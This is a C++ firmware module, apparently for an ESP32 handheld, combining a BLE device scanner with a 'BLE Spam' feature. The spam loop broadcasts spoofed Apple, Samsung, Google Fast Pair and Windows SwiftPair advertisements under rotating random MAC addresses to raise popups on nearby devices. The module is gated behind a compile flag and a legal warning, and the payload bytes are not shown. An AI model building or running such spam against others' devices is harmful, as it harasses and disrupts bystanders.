#include "BleSpam.h"

#include <Arduino.h>
#include <NimBLEDevice.h>

extern "C" int ble_hs_id_set_rnd(const uint8_t* rnd_addr);

#include <algorithm>
#include <string>
#include <vector>

#include "BlePayloads.h"
#include "Config.h"
#include "Display.h"
#include "Logger.h"
#include "MenuManager.h"
#include "ModuleFlags.h"
#include "Navigation.h"
#include "Ui.h"

#if ENABLE_MODULE_BLE

namespace ble {
namespace {

struct ScanResult {
    std::string name;
    std::string address;
    int rssi = 0;
};

std::vector<ScanResult> g_results;

class ScanCallbacks : public NimBLEAdvertisedDeviceCallbacks {
public:
    void onResult(NimBLEAdvertisedDevice* device) override {
        if (device == nullptr) {
            return;
        }
        const std::string address = device->getAddress().toString();
        for (auto& existing : g_results) {
            if (existing.address == address) {
                existing.rssi = std::max(existing.rssi, device->getRSSI());
                if (device->haveName()) {
                    existing.name = device->getName();
                }
                return;
            }
        }
        if (g_results.size() >= 40) {
            return;
        }
        ScanResult result;
        result.address = address;
        result.name = device->haveName() ? device->getName() : "(senza nome)";
        result.rssi = device->getRSSI();
        g_results.push_back(result);
    }
};

void ensureBle() {
    if (!NimBLEDevice::getInitialized()) {
        NimBLEDevice::init("CardputerFW");
    }
}

void drawScanProgress(int round, int total, size_t found, bool interrupted) {
    display::clear();
    display::header("BLE Scanner", "BLE");
    display::textCentered(36, interrupted ? "Scansione interrotta" : "Scansione in corso",
                          interrupted ? display::kWarning : display::kAccent, 2);
    display::progressBar(20, 58, 200, 8,
                         static_cast<float>(round) / std::max(total, 1));
    display::textCentered(76, "Dispositivi trovati: " + std::to_string(found),
                          display::kText, 2);
    display::textCentered(96, "Avvicina i dispositivi per il segnale",
                          display::kTextDim, 0);
    display::footer("` = interrompi");
    display::push();
}

void runScanner() {
    g_results.clear();
    ensureBle();

    NimBLEScan* scan = NimBLEDevice::getScan();
    if (scan == nullptr) {
        ui::message("BLE Scanner", {"!Stack BLE non disponibile.", "Riavvia il dispositivo."}, "BLE");
        return;
    }

    ScanCallbacks callbacks;
    scan->setAdvertisedDeviceCallbacks(&callbacks, true);
    scan->setActiveScan(true);
    scan->setInterval(100);
    scan->setWindow(99);
    scan->stop();  // se una scansione precedente e' rimasta appesa

    constexpr int kRounds = 4;
    // Finestre piu' lunghe: lo scan attivo ha bisogno di tempo per ricevere le
    // SCAN_RESPONSE, che e' dove la maggior parte dei dispositivi mette il nome.
    constexpr uint32_t kRoundMs = 1500;
    // Margine oltre il quale consideriamo la finestra persa e la chiudiamo noi:
    // la variante bloccante di start() aspetta una notifica che, se il
    // controller non completa (o risponde BLE_HS_EALREADY), non arriva mai.
    constexpr uint32_t kGraceMs = 1500;

    bool aborted = false;
    navigation::waitRelease();
    for (int round = 0; round < kRounds && !aborted; ++round) {
        drawScanProgress(round, kRounds, g_results.size(), false);
        scan->start(kRoundMs, nullptr, false);  // non bloccante: si esce subito
        const uint32_t deadline = millis() + kRoundMs + kGraceMs;
        while (scan->isScanning() && millis() < deadline) {
            navigation::update();
            if (navigation::poll().type == navigation::Event::Back) {
                aborted = true;
                break;
            }
            delay(20);
        }
        if (scan->isScanning()) {
            scan->stop();  // finestra chiusa a forza
        }
        scan->clearResults();
    }

    if (aborted) {
        logger::info("BLE scanner interrotto dall'utente");
    }
    logger::info("BLE scanner: %u dispositivi, stack=%s heap=%u",
                 static_cast<unsigned>(g_results.size()),
                 NimBLEDevice::getInitialized() ? "ok" : "non init",
                 static_cast<unsigned>(ESP.getFreeHeap()));

    if (g_results.empty()) {
        ui::message("BLE Scanner",
                    {aborted ? "!Scansione interrotta." : "!Nessun dispositivo rilevato.",
                     "Verifica che il BLE sia attivo nelle vicinanze.",
                     "Se il problema persiste, riavvia il dispositivo."},
                    "BLE");
        return;
    }

    std::sort(g_results.begin(), g_results.end(),
              [](const ScanResult& a, const ScanResult& b) {
                  return a.rssi > b.rssi;
              });

    MenuManager menu("Dispositivi BLE", "BLE");
    for (const auto& result : g_results) {
        std::string name = result.name;
        if (name.size() > 18) {
            name = name.substr(0, 18) + "~";
        }
        const std::string label =
            name + "  " + std::to_string(result.rssi) + "dBm";
        ScanResult copy = result;
        menu.addItem(label, "ble", [copy] {
            ui::message("Dettagli BLE",
                        {"Nome: " + copy.name,
                         "MAC: " + copy.address,
                         "RSSI: " + std::to_string(copy.rssi) + " dBm"},
                        "BLE");
        });
    }
    menu.setHint("ENTER=dettagli  `=indietro");
    menu.run(true);
}

void drawSpam(const char* payloadName, uint32_t packets, uint32_t remainingMs,
              uint32_t totalMs, uint8_t* lastMac) {
    char macText[24];
    snprintf(macText, sizeof(macText), "%02X:%02X:%02X:%02X:%02X:%02X",
             lastMac[5], lastMac[4], lastMac[3], lastMac[2], lastMac[1],
             lastMac[0]);

    display::clear();
    display::header("BLE Spam", "BLE");
    display::text(8, 28, "Payload:", display::kTextDim, 0);
    display::text(8, 40, payloadName, display::kAccent, 2);
    display::text(8, 62, "Pacchetti: " + std::to_string(packets),
                  display::kText, 0);
    display::text(8, 74, "MAC casuale:", display::kTextDim, 0);
    display::text(80, 74, macText, display::kInfo, 0);
    const float fraction =
        totalMs == 0 ? 0.0f
                     : 1.0f - static_cast<float>(remainingMs) / totalMs;
    display::progressBar(8, 92, 150, 8, fraction, display::kDanger);
    display::text(166, 93, std::to_string(remainingMs / 1000) + "s",
                  display::kText, 0);
    display::text(8, 108, "Solo dispositivi propri / ambiente isolato",
                  display::kWarning, 0);
    display::footer("` = interrompi");
    display::push();
}

void runSpam(const std::string& label,
             const std::vector<const BlePayload*>& payloads,
             bool randomize = false) {
    if (payloads.empty()) {
        return;
    }
#if ENABLE_OFFENSIVE
    if (!ui::legalWarning("BLE Spam - " + label,
                          {"Trasmette advertising BLE falsificati.",
                           "Puo' generare popup su dispositivi vicini.",
                           "Usalo solo su dispositivi tuoi o in ambiente",
                           "RF isolato e autorizzato."},
                          "BLE")) {
        return;
    }

    ensureBle();
    NimBLEAdvertising* advertising = NimBLEDevice::getAdvertising();
    advertising->stop();
    NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM, false);
    advertising->setAdvertisementType(BLE_GAP_CONN_MODE_NON);

    const uint16_t intervalMs =
        static_cast<uint16_t>(std::max<uint16_t>(config::bleIntervalMs(), 20));
    uint16_t units = static_cast<uint16_t>(
        std::min<uint32_t>(16384, intervalMs * 1000UL / 625));
    advertising->setMinInterval(units);
    advertising->setMaxInterval(units);

    const uint32_t durationMs =
        static_cast<uint32_t>(std::max<uint16_t>(config::bleDurationSec(), 5)) *
        1000UL;
    const uint32_t start = millis();
    uint32_t nextPacket = 0;
    uint32_t packets = 0;
    uint32_t lastDraw = 0;
    size_t index = 0;
    uint8_t lastMac[6] = {0};
    const char* currentName = payloads[0]->name;

    navigation::waitRelease();

    while (millis() - start < durationMs) {
        navigation::update();
        if (navigation::poll().type == navigation::Event::Back) {
            break;
        }
        const uint32_t now = millis();
        if (now >= nextPacket) {
            advertising->stop();

            esp_fill_random(lastMac, sizeof(lastMac));
            lastMac[0] |= 0xC0;
            lastMac[5] |= 0xC0;
            ble_hs_id_set_rnd(lastMac);

            const size_t next = randomize
                                    ? static_cast<size_t>(esp_random() %
                                                          payloads.size())
                                    : index % payloads.size();
            if (!randomize) {
                ++index;
            }
            const BlePayload* payload = payloads[next];
            currentName = payload->name;
            NimBLEAdvertisementData data;
            data.addData(std::string(reinterpret_cast<const char*>(payload->data),
                                     payload->size));
            advertising->setAdvertisementData(data);
            advertising->start(0);
            ++packets;
            nextPacket = now + intervalMs;
        }

        if (now - lastDraw > 100) {
            const uint32_t elapsed = now - start;
            drawSpam(currentName, packets, durationMs - elapsed, durationMs,
                     lastMac);
            lastDraw = now;
        }
        delay(5);
    }

    advertising->stop();
    logger::info("BLE spam terminato: %u pacchetti", static_cast<unsigned>(packets));
#else
    (void)label;
    ui::message("BLE Spam",
                {"Funzione non compilata.", "Compila con ENABLE_OFFENSIVE=1."},
                "BLE");
#endif
}

std::vector<const BlePayload*> applePayloads() {
    std::vector<const BlePayload*> list;
    for (const auto& payload : kApplePayloads) {
        list.push_back(&payload);
    }
    return list;
}

std::vector<const BlePayload*> googlePayloads() {
    std::vector<const BlePayload*> list;
    for (const auto& payload : kGooglePayloads) {
        list.push_back(&payload);
    }
    return list;
}

std::vector<const BlePayload*> windowsPayloads() {
    std::vector<const BlePayload*> list;
    for (const auto& payload : kWindowsPayloads) {
        list.push_back(&payload);
    }
    return list;
}

std::vector<const BlePayload*> samsungPayloads() {
    std::vector<const BlePayload*> list;
    for (const auto& payload : kSamsungPayloads) {
        list.push_back(&payload);
    }
    return list;
}

std::vector<const BlePayload*> allPayloads() {
    std::vector<const BlePayload*> list = applePayloads();
    const std::vector<std::vector<const BlePayload*>> groups = {
        samsungPayloads(), googlePayloads(), windowsPayloads()};
    for (const auto& group : groups) {
        list.insert(list.end(), group.begin(), group.end());
    }
    return list;
}

}  // namespace

void runMenu() {
    MenuManager menu("BLE", "Menu principale");
    menu.addItem("Scanner BLE", "scan", [] { runScanner(); });
#if ENABLE_OFFENSIVE
    menu.addSeparator("SPAM (solo test autorizzati)");
    menu.addItem("Random (tutti)", "ble", [] {
        runSpam("Random", allPayloads(), true);
    });
    menu.addItem("Apple (AirPods)", "ble", [] {
        runSpam("Apple", applePayloads());
    });
    menu.addItem("Samsung Galaxy", "ble", [] {
        runSpam("Samsung", samsungPayloads());
    });
    menu.addItem("Google Fast Pair", "ble", [] {
        runSpam("Google", googlePayloads());
    });
    menu.addItem("Windows SwiftPair", "ble", [] {
        runSpam("Windows", windowsPayloads());
    });
    menu.addItem("Tutti in sequenza", "ble", [] {
        runSpam("Tutti", allPayloads());
    });
#endif
    menu.setHint("`=indietro  ;.=nav  ENTER=apri");
    menu.run(true);
}

}  // namespace ble

#endif  // ENABLE_MODULE_BLE
